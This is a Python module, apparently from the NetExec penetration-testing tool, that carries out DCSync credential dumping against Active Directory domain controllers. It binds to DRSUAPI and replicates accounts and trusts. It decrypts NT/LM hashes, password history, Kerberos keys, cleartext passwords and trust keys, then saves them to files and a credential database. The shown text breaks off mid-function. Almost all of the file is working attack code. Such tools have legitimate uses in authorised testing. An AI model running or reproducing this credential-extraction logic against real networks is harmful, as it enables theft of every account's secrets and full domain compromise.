from binascii import unhexlify
from contextlib import ExitStack
from dataclasses import dataclass, field
from itertools import chain
from pathlib import Path
from struct import pack, unpack

from Cryptodome.Hash import MD4
from impacket import ntlm
from impacket.dcerpc.v5 import drsuapi, epm, samr, transport
from impacket.dcerpc.v5.dtypes import NULL, SID
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import string_to_bin

from nxc.helpers.logger import highlight
from nxc.helpers.misc import validate_ntlm
from nxc.helpers.rpc import NXCRPCConnection


class DCSyncError(Exception):
    pass


@dataclass
class DCSyncResult:
    domain: str | None
    username: str
    sid: str
    rid: int
    lm_hash: bytes
    nt_hash: bytes
    lm_history: list[bytes] = field(default_factory=list)
    nt_history: list[bytes] = field(default_factory=list)
    kerberos_keys: list[tuple[str, bytes]] = field(default_factory=list)
    cleartext_passwords: list[str] = field(default_factory=list)
    pwd_last_set: int | None = None
    enabled: bool | None = None

    @property
    def identity(self):
        """Account name qualified with its domain when available."""
        return f"{self.domain}\\{self.username}" if self.domain else self.username

    def format_hash(self):
        """Format the current LM and NT hashes in pwdump-compatible form."""
        return (
            f"{self.identity}:{self.rid}:{self.lm_hash.hex()}:{self.nt_hash.hex()}:::"
        )

    def format_history(self):
        """Format prior passwords, excluding the slot that repeats the current hash."""
        lines = []
        empty_lm_hash = ntlm.LMOWFv1("", "")
        for index, nt_hash in enumerate(self.nt_history[1:]):
            lm_hash = (
                self.lm_history[index + 1]
                if index + 1 < len(self.lm_history)
                else empty_lm_hash
            )
            lines.append(
                f"{self.identity}_history{index}:{self.rid}:{lm_hash.hex()}:{nt_hash.hex()}:::"
            )
        return lines


@dataclass
class DCSyncTrustResult:
    partner: str
    flat_name: str | None
    incoming: tuple[bytes, bytes | None] | None
    outgoing: tuple[bytes, bytes | None] | None


class DCSyncOutput:
    """Stream DCSync results to files, the console, and the protocol database."""

    def __init__(
        self,
        connection,
        domain,
        history=False,
        kerberos_keys=False,
        enabled=False,
        trust_keys=False,
    ):
        """Capture output options and initialize counters and lazy file handles."""
        self.connection = connection
        self.domain = domain
        self.history = history
        self.kerberos_keys = kerberos_keys
        self.enabled = enabled
        self.trust_keys = trust_keys
        self.output_filename = Path(
            connection.output_file_template.format(output_folder="ntds")
        )
        self.stack = None
        self.hash_file = None
        self.key_file = None
        self.cleartext_file = None
        self.trust_file = None
        self.hash_count = 0
        self.key_count = 0
        self.trust_count = 0
        self.added_to_db = 0
        self.printed_keys_banner = False
        self.printed_cleartext_banner = False
        self.printed_trust_banner = False
        self.add_to_db = hasattr(connection.db, "get_hosts")
        self.host_id = None
        if self.add_to_db:
            hosts = connection.db.get_hosts(filter_term=connection.host)
            self.host_id = hosts[0][0] if hosts else None

    def __enter__(self):
        """Create the output directory and open the requested result files."""
        self.output_filename.parent.mkdir(parents=True, exist_ok=True)
        stack = ExitStack()
        try:
            self.hash_file = stack.enter_context(
                Path(f"{self.output_filename}.ntds").open("w", encoding="utf-8")
            )
            if self.kerberos_keys:
                self.key_file = stack.enter_context(
                    Path(f"{self.output_filename}.ntds.kerberos").open(
                        "w", encoding="utf-8"
                    )
                )
                self.cleartext_file = stack.enter_context(
                    Path(f"{self.output_filename}.ntds.cleartext").open(
                        "w", encoding="utf-8"
                    )
                )
            if self.trust_keys:
                self.trust_file = stack.enter_context(
                    Path(f"{self.output_filename}.ntds.trustkeys").open(
                        "w", encoding="utf-8"
                    )
                )
        except Exception as e:
            stack.close()
            self.connection.logger.debug(f"Could not open DCSync output files: {e}")
            raise
        self.stack = stack
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        """Close all output files, including after a replication failure."""
        self.stack.close()
        return False

    def write_account(self, result):
        """Write one account and route its optional material and database record."""
        status = (
            "Enabled"
            if result.enabled is True
            else "Disabled"
            if result.enabled is False
            else "N/A"
        )
        line = result.format_hash()
        self.hash_file.write(f"{line} (status={status})\n")
        show_account = not self.enabled or result.enabled is True
        if show_account:
            self.connection.logger.highlight(line)
        self.hash_count += 1
        self.add_credential(result)

        if self.history:
            for history_line in result.format_history():
                self.hash_file.write(history_line + "\n")
                if show_account:
                    self.connection.logger.highlight(history_line)
        if self.kerberos_keys:
            self.write_supplemental(result, show_account)

    def add_credential(self, result):
        """Add one non-machine NTLM credential to databases that support hosts."""
        if not self.add_to_db or result.username.endswith("$"):
            return
        parsed_hash = f"{result.lm_hash.hex()}:{result.nt_hash.hex()}"
        if not validate_ntlm(parsed_hash):
            return
        self.connection.db.add_credential(
            "hash",
            result.domain or self.domain,
            result.username,
            parsed_hash,
            pillaged_from=self.host_id,
        )
        self.added_to_db += 1

    def write_supplemental(self, result, show_account):
        """Write Kerberos keys and cleartext values for one account."""
        for key_type, key in result.kerberos_keys:
            line = f"{result.identity}:{key_type}:{key.hex()}"
            self.key_file.write(line + "\n")
            if show_account:
                if not self.printed_keys_banner:
                    self.connection.logger.display("Kerberos keys:")
                    self.printed_keys_banner = True
                self.connection.logger.highlight(line)
            self.key_count += 1
        for cleartext in result.cleartext_passwords:
            line = f"{result.identity}:CLEARTEXT:{cleartext}"
            self.cleartext_file.write(line + "\n")
            if show_account:
                if not self.printed_cleartext_banner:
                    self.connection.logger.display("Cleartext passwords:")
                    self.printed_cleartext_banner = True
                self.connection.logger.highlight(line)

    def write_trust(self, lines):
        """Write and display formatted trust keys."""
        for line in lines:
            self.trust_file.write(line + "\n")
            if not self.printed_trust_banner:
                self.connection.logger.display("Trust keys:")
                self.printed_trust_banner = True
            self.connection.logger.highlight(line)
            self.trust_count += 1

    def log_summary(self, just_trust_keys=False):
        """Report output paths and result counts after all files are closed."""
        ntds_outfile = f"{self.output_filename}.ntds"
        if just_trust_keys:
            self.connection.logger.success(
                f"Dumped {highlight(self.trust_count)} trust keys to {ntds_outfile}.trustkeys"
            )
            return
        self.connection.logger.success(
            f"Dumped {highlight(self.hash_count)} NTDS hashes to {ntds_outfile} of which {highlight(self.added_to_db)} were added to the database"
        )
        if self.kerberos_keys:
            self.connection.logger.success(
                f"Dumped {highlight(self.key_count)} Kerberos keys to {ntds_outfile}.kerberos"
            )
        if self.trust_keys:
            self.connection.logger.success(
                f"Dumped {highlight(self.trust_count)} trust keys to {ntds_outfile}.trustkeys"
            )
        self.connection.logger.display(
            "To extract only enabled accounts from the output file, run the following command: "
        )
        self.connection.logger.display(
            f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1"
        )


class DCSync:
    """
    DRSUAPI replication engine shared by NetExec protocols.

    The helper resolves DRSUAPI through EPM, opens an authenticated RPC/TCP
    connection, binds to DRS, and discovers the server DSA GUID. It then replicates
    one object or pages through the domain naming context, decrypts the returned
    secrets, and writes the results through NetExec's output and database layers.

    The protocol supplies credentials, target metadata, logging, and output state;
    the EPM and DRS connections are owned independently by this class.
    """

    ATTRIBUTES = {
        "userPrincipalName": "1.2.840.113556.1.4.656",
        "sAMAccountName": "1.2.840.113556.1.4.221",
        "unicodePwd": "1.2.840.113556.1.4.90",
        "dBCSPwd": "1.2.840.113556.1.4.55",
        "ntPwdHistory": "1.2.840.113556.1.4.94",
        "lmPwdHistory": "1.2.840.113556.1.4.160",
        "supplementalCredentials": "1.2.840.113556.1.4.125",
        "objectSid": "1.2.840.113556.1.4.146",
        "pwdLastSet": "1.2.840.113556.1.4.96",
        "userAccountControl": "1.2.840.113556.1.4.8",
        "sAMAccountType": "1.2.840.113556.1.4.302",
        "trustPartner": "1.2.840.113556.1.4.133",
        "flatName": "1.2.840.113556.1.4.511",
        "trustAuthIncoming": "1.2.840.113556.1.4.129",
        "trustAuthOutgoing": "1.2.840.113556.1.4.135",
    }
    ATTRTYPES = {
        "userPrincipalName": 0x90290,
        "sAMAccountName": 0x900DD,
        "unicodePwd": 0x9005A,
        "dBCSPwd": 0x90037,
        "ntPwdHistory": 0x9005E,
        "lmPwdHistory": 0x900A0,
        "supplementalCredentials": 0x9007D,
        "objectSid": 0x90092,
        "pwdLastSet": 0x90060,
        "userAccountControl": 0x90008,
        "sAMAccountType": 0x9012E,
        "trustPartner": 0x90085,
        "flatName": 0x901FF,
        "trustAuthIncoming": 0x90081,
        "trustAuthOutgoing": 0x90087,
    }
    ACCOUNT_TYPES = (0x30000000, 0x30000001, 0x30000002)
    ACCOUNT_ATTRIBUTES = (
        "userPrincipalName",
        "sAMAccountName",
        "unicodePwd",
        "dBCSPwd",
        "ntPwdHistory",
        "lmPwdHistory",
        "supplementalCredentials",
        "objectSid",
        "pwdLastSet",
        "userAccountControl",
        "sAMAccountType",
    )
    TRUST_ATTRIBUTES = (
        "trustPartner",
        "flatName",
        "trustAuthIncoming",
        "trustAuthOutgoing",
    )
    KERBEROS_TYPES = {
        1: "des-cbc-crc",
        3: "des-cbc-md5",
        17: "aes128-cts-hmac-sha1-96",
        18: "aes256-cts-hmac-sha1-96",
        0xFFFFFF74: "rc4_hmac",
    }
    ATTRIBUTE_NAMES_BY_OID = dict(zip(ATTRIBUTES.values(), ATTRIBUTES, strict=True))
    ATTRIBUTE_NAMES_BY_ATTID = dict(zip(ATTRTYPES.values(), ATTRTYPES, strict=True))
    MAX_OBJECTS_PER_REPLY = 200

    def __init__(self, connection, target=None, domain=None):
        """Capture shared NetExec state and initialize lazy RPC and schema caches."""
        self.connection = connection
        self.target = target or connection.host
        self.remote_name = connection.remoteName or self.target
        self.domain = (
            domain or getattr(connection, "targetDomain", None) or connection.domain
        )
        self.rpc = None
        self.dce = None
        self.drs_handle = None
        self.dsa_guid = None
        self.partial_attribute_sets = {}
        self.prefix_table = []

    def __enter__(self):
        """Connect and bind when entering a managed DCSync session."""
        self.connect()
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        """Unbind and disconnect when leaving a managed DCSync session."""
        self.disconnect()
        return False

    def connect(self):
        """Resolve the DRS endpoint and establish an authenticated, encrypted bind."""
        if self.dce is not None:
            return
        if not self.domain:
            raise DCSyncError("A domain name is required for DRSUAPI binding")

        # EPM only resolves the dynamic port; authentication happens on DRSUAPI.
        mapped_binding = epm.hept_map(
            self.target,
            drsuapi.MSRPC_UUID_DRSUAPI,
            protocol="ncacn_ip_tcp",
            timeout=getattr(self.connection.args, "rpc_timeout", None),
        )

        endpoint = transport.DCERPCStringBinding(mapped_binding).get_endpoint()
        self.rpc = NXCRPCConnection(self.connection, force_tcp=True)
        try:
            self.dce = self.rpc.connect(
                "",
                drsuapi.MSRPC_UUID_DRSUAPI,
                target_ip=self.target,
                auth_level=RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                string_binding=f"ncacn_ip_tcp:{self.remote_name}[{endpoint}]",
            )
            self.bind()
        except Exception as e:
            self.connection.logger.debug(f"DRS connection failed: {e}")
            self.disconnect()
            raise

    def disconnect(self):
        """Release the DRS context handle and close its RPC transport."""
        if self.dce is not None and self.drs_handle is not None:
            try:
                drsuapi.hDRSUnbind(self.dce, self.drs_handle)
            except Exception as e:
                self.connection.logger.debug(f"DRSUnbind failed: {e}")
        if self.rpc is not None:
            self.rpc.disconnect()
        self.rpc = None
        self.dce = None
        self.drs_handle = None
        self.dsa_guid = None

    def bind(self):
        """Negotiate DRS extensions and discover the DC's NTDS DSA object GUID."""
        request = drsuapi.DRSBind()
        request["puuidClientDsa"] = drsuapi.NTDSAPI_CLIENT_GUID
        extensions = drsuapi.DRS_EXTENSIONS_INT()
        extensions["dwFlags"] = (
            drsuapi.DRS_EXT_GETCHGREQ_V6
            | drsuapi.DRS_EXT_GETCHGREPLY_V6
            | drsuapi.DRS_EXT_GETCHGREQ_V8
            | drsuapi.DRS_EXT_STRONG_ENCRYPTION
            | drsuapi.DRS_EXT_NONDOMAIN_NCS
        )
        extensions["SiteObjGuid"] = drsuapi.NULLGUID
        extensions["Pid"] = 0
        extensions["dwReplEpoch"] = 0
        extensions["dwFlagsExt"] = 0
        extensions["ConfigObjGUID"] = drsuapi.NULLGUID
        extensions["dwExtCaps"] = 0xFFFFFFFF
        request["pextClient"]["cb"] = len(extensions)
        request["pextClient"]["rgb"] = list(extensions.getData())
        response = self.dce.request(request)

        # A nonzero replication epoch must be echoed in a second DRSBind request.
        server_extensions = drsuapi.DRS_EXTENSIONS_INT()
        extension_data = b"".join(response["ppextServer"]["rgb"])
        server_extensions.fromString(
            extension_data.ljust(len(server_extensions), b"\x00")
        )
        if server_extensions["dwReplEpoch"]:
            extensions["dwReplEpoch"] = server_extensions["dwReplEpoch"]
            request["pextClient"]["rgb"] = list(extensions.getData())
            response = self.dce.request(request)

        self.drs_handle = response["phDrs"]
        # DRSGetNCChanges identifies the destination replica with this DSA GUID.
        response = drsuapi.hDRSDomainControllerInfo(
            self.dce, self.drs_handle, self.domain, 2
        )
        if response["pmsgOut"]["V2"]["cItems"] == 0:
            raise DCSyncError(
                f"Could not resolve the NTDS DSA object GUID for {self.domain}"
            )
        self.dsa_guid = response["pmsgOut"]["V2"]["rItems"][0]["NtdsDsaObjectGuid"]

    def sync(self, account):
        """Resolve and replicate one account with the EXOP_REPL_OBJ operation."""
        if self.dce is None:
            self.connect()
        ds_name = self.resolve_account(account)
        response = self.get_changes(ds_name)
        reply = response["pmsgOut"][f"V{response['pdwOutVersion']}"]
        if reply["cNumObjects"] == 0:
            raise DCSyncError(f"DRSGetNCChanges returned no object for {account}")
        return self.parse_object(
            reply["pObjects"]["Entinf"], reply["PrefixTableSrc"]["pPrefixEntry"]
        )

    def sync_many(self, accounts):
        """Replicate an iterable of account names through the same DRS session."""
        if self.dce is None:
            self.connect()
        for account in accounts:
            yield self.sync(account)

    def sync_domain(self, accounts=True, trusts=False):
        """Page through the domain naming context and yield accounts or trusts."""
        if self.dce is None:
            self.connect()

        attribute_names = ()
        if accounts:
            attribute_names += self.ACCOUNT_ATTRIBUTES
        if trusts:
            attribute_names += self.TRUST_ATTRIBUTES
        if not attribute_names:
            return
        request = self.build_domain_request(attribute_names)
        while True:
            response = self.dce.request(request)
            reply = response["pmsgOut"][f"V{response['pdwOutVersion']}"]
            prefix_table = reply["PrefixTableSrc"]["pPrefixEntry"]
            # Replicated objects form a linked list rooted at pObjects.
            current = reply["pObjects"]
            for _ in range(reply["cNumObjects"]):
                entry = current["Entinf"]
                attributes = self.parse_attributes(entry, prefix_table)
                account_type = self.first_value(attributes, "sAMAccountType")
                if (
                    accounts
                    and account_type
                    and unpack("<L", account_type)[0] in self.ACCOUNT_TYPES
                ):
                    yield self.parse_object(entry, prefix_table, attributes)
                elif trusts and self.first_value(attributes, "trustPartner"):
                    yield self.parse_trust_object(attributes)
                current = current["pNextEntInf"]

            if not reply["fMoreData"]:
                break
            # The server's invocation ID and USN vector are the next-page cookie.
            request["pmsgIn"]["V8"]["uuidInvocIdSrc"] = reply["uuidInvocIdSrc"]
            request["pmsgIn"]["V8"]["usnvecFrom"] = reply["usnvecTo"]

    def resolve_account(self, account):
        """Convert a SID, GUID, or account name into the DSNAME DRS expects."""
        if account.upper().startswith("S-1-"):
            offered_format = drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME
        elif account.startswith("{") and account.endswith("}"):
            offered_format = drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME
        elif "\\" in account or "/" in account:
            offered_format = drsuapi.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME
        else:
            offered_format = drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
        response = drsuapi.hDRSCrackNames(
            self.dce,
            self.drs_handle,
            0,
            offered_format,
            drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
            (account.replace("/", "\\"),),
        )
        result = response["pmsgOut"]["V1"]["pResult"]
        if result["cItems"] != 1 or result["rItems"][0]["status"] != 0:
            if offered_format == drsuapi.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME:
                domain, username = account.replace("/", "\\").rsplit("\\", 1)
                flat_name = self.resolve_domain_flat_name()
                local_names = (
                    self.domain,
                    self.domain.split(".", 1)[0],
                    flat_name or "",
                )
                # Some DCs reject a local qualified name but accept its bare account.
                if domain.lower() in (name.lower() for name in local_names):
                    return self.resolve_account(username)
            status = result["rItems"][0]["status"] if result["cItems"] else "no result"
            raise DCSyncError(f"DRSCrackNames failed for {account}: {status}")
        return self.build_guid_name(result["rItems"][0]["pName"].rstrip("\x00"))

    def build_guid_name(self, guid):
        """Build a DSNAME that selects an object by GUID."""
        ds_name = drsuapi.DSNAME()
        ds_name["SidLen"] = 0
        ds_name["Guid"] = string_to_bin(guid.strip("{}"))
        ds_name["Sid"] = ""
        ds_name["NameLen"] = 0
        ds_name["StringName"] = "\x00"
        ds_name["structLen"] = len(ds_name.getData())
        return ds_name

    def build_domain_name(self):
        """Build the domain naming-context DSNAME from its DNS name."""
        name = ",".join(f"DC={part}" for part in self.domain.split("."))
        ds_name = drsuapi.DSNAME()
        ds_name["SidLen"] = 0
        ds_name["Guid"] = drsuapi.NULLGUID
        ds_name["Sid"] = ""
        ds_name["NameLen"] = len(name)
        ds_name["StringName"] = f"{name}\x00"
        ds_name["structLen"] = len(ds_name.getData())
        return ds_name

    def get_changes(self, ds_name):
        """Issue a one-object DRSGetNCChanges request for selected secret fields."""
        request = drsuapi.DRSGetNCChanges()
        request["hDrs"] = self.drs_handle
        request["dwInVersion"] = 8
        request["pmsgIn"]["tag"] = 8
        request["pmsgIn"]["V8"]["uuidDsaObjDest"] = self.dsa_guid
        request["pmsgIn"]["V8"]["uuidInvocIdSrc"] = self.dsa_guid
        request["pmsgIn"]["V8"]["pNC"] = ds_name
        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighObjUpdate"] = 0
        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighPropUpdate"] = 0
        request["pmsgIn"]["V8"]["pUpToDateVecDest"] = NULL
        request["pmsgIn"]["V8"]["ulFlags"] = (
            drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        )
        request["pmsgIn"]["V8"]["cMaxObjects"] = 1
        request["pmsgIn"]["V8"]["cMaxBytes"] = 0
        request["pmsgIn"]["V8"]["ulExtendedOp"] = drsuapi.EXOP_REPL_OBJ
        request["pmsgIn"]["V8"]["pPartialAttrSet"] = self.get_partial_attribute_set(
            self.ACCOUNT_ATTRIBUTES
        )
        request["pmsgIn"]["V8"]["PrefixTableDest"]["PrefixCount"] = len(
            self.prefix_table
        )
        request["pmsgIn"]["V8"]["PrefixTableDest"]["pPrefixEntry"] = self.prefix_table
        request["pmsgIn"]["V8"]["pPartialAttrSetEx1"] = NULL
        return self.dce.request(request)

    def build_domain_request(self, attribute_names=None):
        """Build the first request for a paged domain replication cycle."""
        request = drsuapi.DRSGetNCChanges()
        request["hDrs"] = self.drs_handle
        request["dwInVersion"] = 8
        request["pmsgIn"]["tag"] = 8
        request["pmsgIn"]["V8"]["uuidDsaObjDest"] = self.dsa_guid
        request["pmsgIn"]["V8"]["uuidInvocIdSrc"] = drsuapi.NULLGUID
        request["pmsgIn"]["V8"]["pNC"] = self.build_domain_name()
        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighObjUpdate"] = 0
        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighPropUpdate"] = 0
        request["pmsgIn"]["V8"]["pUpToDateVecDest"] = NULL
        # Request ordinary replication: SPECIAL_SECRET_PROCESSING would omit secrets.
        request["pmsgIn"]["V8"]["ulFlags"] = (
            drsuapi.DRS_INIT_SYNC
            | drsuapi.DRS_PER_SYNC
            | drsuapi.DRS_WRIT_REP
            | drsuapi.DRS_FULL_SYNC_NOW
        )
        request["pmsgIn"]["V8"]["cMaxObjects"] = self.MAX_OBJECTS_PER_REPLY
        request["pmsgIn"]["V8"]["cMaxBytes"] = 0
        request["pmsgIn"]["V8"]["ulExtendedOp"] = 0
        request["pmsgIn"]["V8"]["pPartialAttrSet"] = self.get_partial_attribute_set(
            attribute_names
        )
        request["pmsgIn"]["V8"]["PrefixTableDest"]["PrefixCount"] = len(
            self.prefix_table
        )
        request["pmsgIn"]["V8"]["PrefixTableDest"]["pPrefixEntry"] = self.prefix_table
        request["pmsgIn"]["V8"]["pPartialAttrSetEx1"] = NULL
        return request

    def get_partial_attribute_set(self, attribute_names=None):
        """Map requested attribute OIDs to ATTIDs and cache the partial set."""
        attribute_names = tuple(attribute_names or self.ATTRIBUTES)
        if attribute_names in self.partial_attribute_sets:
            return self.partial_attribute_sets[attribute_names]

        partial_attribute_set = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
        partial_attribute_set["dwVersion"] = 1
        partial_attribute_set["cAttrs"] = len(attribute_names)
        for name in attribute_names:
            partial_attribute_set["rgPartialAttr"].append(
                drsuapi.MakeAttid(self.prefix_table, self.ATTRIBUTES[name])
            )
        self.partial_attribute_sets[attribute_names] = partial_attribute_set
        return partial_attribute_set

    def parse_object(self, entry, prefix_table, attributes=None):
        """Convert a replicated account object into decrypted credential material."""
        attributes = attributes or self.parse_attributes(entry, prefix_table)
        sid_data = self.first_value(attributes, "objectSid") or self.to_bytes(
            entry["pName"]["Sid"]
        )
        rid = unpack("<L", sid_data[-4:])[0]
        username = (
            self.decode_string(self.first_value(attributes, "sAMAccountName"))
            or "unknown"
        )
        principal_name = self.decode_string(
            self.first_value(attributes, "userPrincipalName")
        )
        domain = (
            principal_name.rsplit("@", 1)[-1]
            if principal_name and "@" in principal_name
            else self.domain
        )
        lm_hash = self.decrypt_hash(
            self.first_value(attributes, "dBCSPwd"), rid, ntlm.LMOWFv1("", "")
        )
        nt_hash = self.decrypt_hash(
            self.first_value(attributes, "unicodePwd"), rid, ntlm.NTOWFv1("", "")
        )
        user_account_control = self.first_value(attributes, "userAccountControl")
        pwd_last_set = self.first_value(attributes, "pwdLastSet")
        try:
            kerberos_keys, cleartext_passwords = self.parse_supplemental_credentials(
                self.first_value(attributes, "supplementalCredentials")
            )
        except Exception as e:
            self.connection.logger.debug(
                f"Could not parse supplemental credentials for {username}: {e}"
            )
            kerberos_keys, cleartext_passwords = [], []

        return DCSyncResult(
            domain=domain,
            username=username,
            sid=SID(data=sid_data).formatCanonical(),
            rid=rid,
            lm_hash=lm_hash,
            nt_hash=nt_hash,
            lm_history=self.decrypt_history(
                self.first_value(attributes, "lmPwdHistory"), rid
            ),
            nt_history=self.decrypt_history(
                self.first_value(attributes, "ntPwdHistory"), rid
            ),
            kerberos_keys=kerberos_keys,
            cleartext_passwords=cleartext_passwords,
            pwd_last_set=unpack("<Q", pwd_last_set)[0] if pwd_last_set else None,
            enabled=not bool(
                unpack("<L", user_account_control)[0] & samr.UF_ACCOUNTDISABLE
            )
            if user_account_control
            else None,
        )

    def parse_trust_object(self, attributes):
        """Convert replicated trust attributes into current and previous secrets."""
        partner = self.decode_string(self.first_value(attributes, "trustPartner"))
        flat_name = self.decode_string(self.first_value(attributes, "flatName"))
        incoming = self.parse_trust_auth(
            self.first_value(attributes, "trustAuthIncoming")
        )
        outgoing = self.parse_trust_auth(
            self.first_value(attributes, "trustAuthOutgoing")
        )
        return DCSyncTrustResult(
            partner=partner, flat_name=flat_name, incoming=incoming, outgoing=outgoing
        )

    def parse_trust_auth(self, value):
        """Decrypt and extract current and previous values from a trustAuth blob."""
        if value is None:
            return None
        try:
            plaintext = drsuapi.DecryptAttributeValue(self.dce, value)
            if len(plaintext) < 12:
                return None
            current_offset, previous_offset = unpack("<II", plaintext[4:12])
            current = self.read_trust_auth_value(plaintext, current_offset)
            previous = self.read_trust_auth_value(plaintext, previous_offset)
            return (current, previous) if current is not None else None
        except Exception as e:
            self.connection.logger.debug(
                f"Could not parse a trust authentication secret: {e}"
            )
            return None

    def read_trust_auth_value(self, plaintext, offset):
        """Read one offset-based authentication value from a trustAuth blob."""
        # Each referenced record has a 16-byte header; its final DWORD is cbAuthInfo.
        if offset < 12 or offset + 16 > len(plaintext):
            return None
        length = unpack("<I", plaintext[offset + 12 : offset + 16])[0]
        end = offset + 16 + length
        return plaintext[offset + 16 : end] if end <= len(plaintext) else None

    def parse_attributes(self, entry, prefix_table):
        """Resolve replicated ATTIDs and collect the attribute values used here."""
        attributes = {}
        for attribute in entry["AttrBlock"]["pAttr"]:
            attid = attribute["attrTyp"]
            if hasattr(attid, "fields"):
                attid = attid["Data"]
            name = self.resolve_attribute_name(prefix_table, attid)
            if name is not None and attribute["AttrVal"]["valCount"]:
                attributes[name] = [
                    self.to_bytes(value["pVal"])
                    for value in attribute["AttrVal"]["pAVal"]
                ]
        return attributes

    def resolve_attribute_name(self, prefix_table, attid):
        """Resolve an ATTID through the reply prefix table or its fixed fallback."""
        try:
            name = self.ATTRIBUTE_NAMES_BY_OID.get(
                drsuapi.OidFromAttid(prefix_table, attid)
            )
        except TypeError as e:
            self.connection.logger.debug(
                f"Normalizing the DRS prefix table after OID conversion failed: {e}"
            )
            self.normalize_prefix_table(prefix_table)
            try:
                name = self.ATTRIBUTE_NAMES_BY_OID.get(
                    drsuapi.OidFromAttid(prefix_table, attid)
                )
            except (TypeError, ValueError) as e:
                self.connection.logger.debug(
                    f"Could not resolve DRS attribute {attid}: {e}"
                )
                name = None
        except ValueError as e:
            self.connection.logger.debug(
                f"Could not resolve DRS attribute {attid}: {e}"
            )
            name = None
        return name or self.ATTRIBUTE_NAMES_BY_ATTID.get(attid)

    def normalize_prefix_table(self, prefix_table):
        """Normalize NDR prefix elements to the byte chunks Impacket expects."""
        # Depending on NDR decoding, the same wire field can arrive as integer bytes.
        for prefix in prefix_table:
            elements = prefix["prefix"]["elements"]
            if elements and isinstance(elements[0], int):
                prefix["prefix"]["elements"] = [pack("B", value) for value in elements]

    def decrypt_hash(self, value, rid, default):
        """Remove the RPC session encryption and RID DES layer from one hash."""
        if value is None:
            return default
        return drsuapi.removeDESLayer(
            drsuapi.DecryptAttributeValue(self.dce, value), rid
        )

    def decrypt_history(self, value, rid):
        """Decrypt a password-history blob and split it into 16-byte hashes."""
        if value is None:
            return []
        history = drsuapi.DecryptAttributeValue(self.dce, value)
        return [
            drsuapi.removeDESLayer(history[offset : offset + 16], rid)
            for offset in range(0, len(history) - len(history) % 16, 16)
        ]

    def parse_supplemental_credentials(self, value):
        """Extract Kerberos keys and cleartext values from USER_PROPERTIES."""
        if value is None:
            return [], []
        plaintext = drsuapi.DecryptAttributeValue(self.dce, value)
        if len(plaintext) <= 24:
            return [], []

        # supplementalCredentials embeds a sequence of named USER_PROPERTY blobs.
        _, property_count, properties = samr.unpack_user_properties(plaintext)
        kerberos_keys = []
        cleartext_passwords = []
        for _ in range(property_count):
            user_property = samr.USER_PROPERTY(properties)
            properties = properties[len(user_property) :]
            property_name = user_property["PropertyName"].decode("utf-16le")
            if property_name == "Primary:Kerberos-Newer-Keys":
                property_value = unhexlify(user_property["PropertyValue"])
                credentials = samr.KERB_STORED_CREDENTIAL_NEW(property_value)
                key_data = credentials["Buffer"]
                for _ in range(credentials["CredentialCount"]):
                    key = samr.KERB_KEY_DATA_NEW(key_data)
                    key_data = key_data[len(key) :]
                    key_value = property_value[
                        key["KeyOffset"] : key["KeyOffset"] + key["KeyLength"]
                    ]
                    kerberos_keys.append((
                        self.KERBEROS_TYPES.get(key["KeyType"], hex(key["KeyType"])),
                        key_value,
                    ))
            elif property_name == "Primary:CLEARTEXT":
                cleartext = unhexlify(user_property["PropertyValue"])
                try:
                    cleartext_passwords.append(cleartext.decode("utf-16le"))
                except UnicodeDecodeError as e:
                    self.connection.logger.debug(
                        f"Could not decode a cleartext password as UTF-16LE: {e}"
                    )
                    cleartext_passwords.append(f"0x{cleartext.hex()}")
        return kerberos_keys, cleartext_passwords

    def resolve_domain_flat_name(self):
        """Resolve the local DNS domain to its NetBIOS name for trust key salts."""
        domain_name = ",".join(f"DC={part}" for part in self.domain.split("."))
        try:
            response = drsuapi.hDRSCrackNames(
                self.dce,
                self.drs_handle,
                0,
                drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME,
                drsuapi.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME,
                (domain_name,),
            )
            result = response["pmsgOut"]["V1"]["pResult"]
            if result["cItems"] == 1 and result["rItems"][0]["status"] == 0:
                return result["rItems"][0]["pName"].rstrip("\x00\\")
        except Exception as e:
            self.connection.logger.debug(
                f"Could not resolve the local domain flat name: {e}"
            )
        return None

    def format_trust_result(
        self, result, history=False, kerberos_keys=False, local_flat_name=None
    ):
        """Format both directions of a trust, optionally including old secrets."""
        lines = []
        for secrets, incoming in ((result.incoming, True), (result.outgoing, False)):
            if not secrets:
                continue
            current, previous = secrets
            if current:
                lines.extend(
                    self.format_trust_secret(
                        result,
                        current,
                        incoming=incoming,
                        previous=False,
                        kerberos_keys=kerberos_keys,
                        local_flat_name=local_flat_name,
                    )
                )
            if history and previous:
                lines.extend(
                    self.format_trust_secret(
                        result,
                        previous,
                        incoming=incoming,
                        previous=True,
                        kerberos_keys=kerberos_keys,
                        local_flat_name=local_flat_name,
                    )
                )
        return lines

    def format_trust_secret(
        self,
        result,
        secret,
        *,
        incoming,
        previous,
        kerberos_keys,
        local_flat_name,
    ):
        """Derive the RC4 and optional AES keys for one trust secret."""
        direction = "Incoming" if incoming else "Outgoing"
        if previous:
            direction += ", previous"
        lines = [
            f"{result.partner} ({direction}):rc4_hmac:{MD4.new(secret).hexdigest()}"
        ]
        if not kerberos_keys:
            return lines

        if incoming:
            realm = self.domain.upper()
            partner = result.partner.upper()
            flat_name = result.flat_name
        else:
            realm = result.partner.upper()
            partner = self.domain.upper()
            flat_name = local_flat_name
        salts = [("", f"{realm}krbtgt{partner}".encode())]
        if flat_name:
            salts.append((
                " (trust account)",
                f"{realm}krbtgt{flat_name.upper()}".encode(),
            ))
        password = secret.decode("utf-16le", "replace").encode()
        for encryption_type in (
